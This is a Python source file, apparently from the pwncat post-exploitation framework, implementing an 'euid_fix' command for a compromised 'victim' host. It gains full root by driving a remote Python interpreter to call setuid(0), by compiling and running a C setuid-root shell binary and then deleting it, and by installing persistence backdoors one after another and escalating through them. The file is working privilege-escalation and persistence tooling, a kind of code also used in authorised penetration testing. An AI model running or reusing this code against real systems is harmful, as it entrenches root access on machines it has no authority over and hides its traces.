#!/usr/bin/env python3
"""
Provide the capability to manually fix a situation where your real and
effective UID do not match. This command attempts a few different methods
to correct the mismatch, ending with attempting to install a persistence
method and then escalate manually back into root to gain EUID==UID==0.
"""
from io import StringIO
import textwrap
import time

from rich.progress import Progress, BarColumn, TimeRemainingColumn

from pwncat.commands.base import CommandDefinition
from pwncat.persist import PersistenceError
from pwncat.util import console, CompilationError
import pwncat


class Command(CommandDefinition):
    """ Check for and attempt to automatically correct an EUID/UID
    mismatch. This usually happens after a manual privilege escaltion
    with a SUID binary. This command will first attempt to use a few
    scripting methods to change the real UID (currently only python
    if available) and then attempt to compile a binary for the remote
    system which will set the real UID. If the scripting and compiled
    methods fail, the command will try to install each persistence
    method in order until one successfully provides access w/ EUID=UID=0.
    """

    PROG = "euid_fix"
    ARGS = {}
    DEFAULTS = {}
    LOCAL = False

    def run(self, args):

        ident = pwncat.victim.id

        # Ensure we are actually EUID=0
        if ident["euid"]["id"] != 0:
            console.log("euid is not 0")
            return

        # Check that UID != EUID
        if ident["uid"]["id"] == 0:
            console.log("no euid/uid mismatch detected")
            return

        # First try to escalate with python. This removes the need
        # for any system modifications. Which will resolve a variety
        # of python verions including "python2" and "python3".
        python = pwncat.victim.which("python")
        if python is not None:
            console.log("attempting [yellow]python-based[/yellow] fix")
            pwncat.victim.run(python, wait=False)
            pwncat.victim.client.send(b"import os\n")
            pwncat.victim.client.send(b"os.setuid(0)\n")
            pwncat.victim.client.send(b"os.setgid(0)\n")
            pwncat.victim.client.send(
                f'os.system("{pwncat.victim.shell}")\n'.encode("utf-8")
            )
            time.sleep(0.5)

            ident = pwncat.victim.id
            if ident["uid"]["id"] == ident["euid"]["id"]:
                console.log("euid/uid mismatch [green]corrected[/green]!")
                pwncat.victim.reset(hard=False)
                return

            console.log("python-based fix [red]failed[/red]")

        # Quick and simple UID=EUID fix
        fix_source = textwrap.dedent(
            """
            #include <stdio.h>

            int main(int argc, char** argv) {
                setuid(0);
                setgid(0);
                execl("{0}", "{0}", NULL);
            }
        """.replace(
                "{0}", pwncat.victim.shell
            )
        )

        # See if we can compile it
        try:
            console.log("attempting [yellow]c-based[/yellow] fix")
            remote_binary = pwncat.victim.compile([StringIO(fix_source)])
            # Appears to have went well, try to execute
            pwncat.victim.run(remote_binary, wait=False)

            # Give it some time to catch up
            time.sleep(0.5)

            # Remove the binary
            pwncat.victim.env(["rm", "-f", remote_binary])

            ident = pwncat.victim.id
            if ident["uid"]["id"] == ident["euid"]["id"]:
                console.log("euid/uid corrected!")
                pwncat.victim.reset(hard=False)
                return
        except CompilationError:
            console.log(
                "[yellow]warning[/yellow]: compilation failed, attempting persistence"
            )

        # Installation/removal of privilege escalation methods can take time,
        # so we start a progress bar.
        with Progress(
            "[progress.description]{task.fields[status]}",
            BarColumn(bar_width=None),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeRemainingColumn(),
        ) as progress:
            methods = list(pwncat.victim.persist.available)
            task_id = progress.add_task("", total=len(methods), status="initializing")
            for method in methods:
                progress.update(
                    task_id,
                    status=f"installing [yellow]{method.name}[/yellow]",
                    advance=1,
                )

                # Depending on the method type, we may need to specify a user
                if method.system:
                    user = None
                else:
                    user = "root"

                try:
                    # Attempt to install
                    pwncat.victim.persist.install(method.name, user)
                except PersistenceError:
                    # This one failed :( try another
                    continue

                try:
                    # Install succeeded, attempt to escalate
                    progress.update(
                        task_id, status=f"[yellow]{method.name}[/yellow] installed"
                    )
                    method.escalate(user)
                    pwncat.victim.reset(hard=False)
                    progress.update(
                        task_id,
                        status=f"[yellow]{method.name}[/yellow] succeeded!",
                        completed=len(methods),
                    )
                    progress.log(
                        f"[yellow]{method.name}[/yellow] succeeded; mismatch [green]fixed[/green]!"
                    )
                    progress.update(task_id, visible=False)
                    break
                except PersistenceError:
                    # Escalation failed, remove persistence :(
                    pwncat.victim.persist.remove(method.name, user)
